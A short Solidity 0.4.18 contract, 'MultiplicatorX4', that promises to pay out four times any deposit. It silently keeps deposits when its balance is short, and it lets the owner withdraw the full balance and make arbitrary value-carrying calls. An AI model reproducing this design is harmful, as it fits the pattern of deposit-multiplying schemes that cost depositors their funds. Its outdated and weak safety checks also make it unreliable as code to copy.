pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr != address(0)); // Check that address is not null

        bool success = adr.call.value(msg.value)(data);
        require(success); // Check that the call was successful
    }

    function multiplicate(address adr) public payable {
        require(adr != address(0)); // Check that address is not null
        require(msg.value > 0); // Check that value is greater than zero

        uint multipliedValue = msg.value * 4;
        require(multipliedValue >= msg.value); // Check for overflow

        if (this.balance >= multipliedValue) {
            adr.transfer(multipliedValue);
        }
    }
}